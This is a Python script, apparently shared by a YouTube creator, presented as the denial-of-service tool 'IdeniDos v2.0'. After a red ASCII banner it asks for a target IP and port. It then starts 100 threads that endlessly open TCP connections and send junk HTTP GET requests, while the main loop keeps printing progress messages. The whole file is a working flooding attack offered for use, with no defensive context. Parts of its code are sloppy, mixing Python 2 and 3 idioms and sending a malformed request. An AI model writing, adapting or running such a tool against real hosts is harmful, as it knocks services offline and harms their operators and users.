import socket
from threading import Thread
from colorama import init, Fore, Style
init()

print(Fore.RED + ".___    .___            .__  _____   		        ") 	
print(Fore.RED + "|   | __| _/____   ____ |__|/ ____\__.__.             ")	
print(Fore.RED + "|   |/ __ |/ __ \ /    \|  \   __<   |  |             ")	
print(Fore.RED + "|   / /_/ \  ___/|   |  \  ||  |  \___  |             ")	
print(Fore.RED + "|___\____ |\___  >___|  /__||__|  / ____| 	     	")	
print(Fore.RED + "               \/    \/     \/    \/      v2.0     	")     
print(Fore.RED + "						    	")
print(Fore.RED + "   IdeniDos v2.0				   	")
print(Fore.RED + "    YouTube: Idenify				    	")
print(Fore.RED + "						     	")
print(Fore.GREEN + "")
print 
print 
host = raw_input("IP Target : ")
ip = host
port = input("Port      : ")
port = port
def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "Idenify" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "Idenify" + "HTTP/1.1 \r\n"), (ip, port) )
        except socket.error:
            print("error")
        mysocket.close()

for i in range(100):
    t = Thread(target=dos)
    t.start()

while True:
     print "Send packet to %s throught port:%s"%(ip,port)


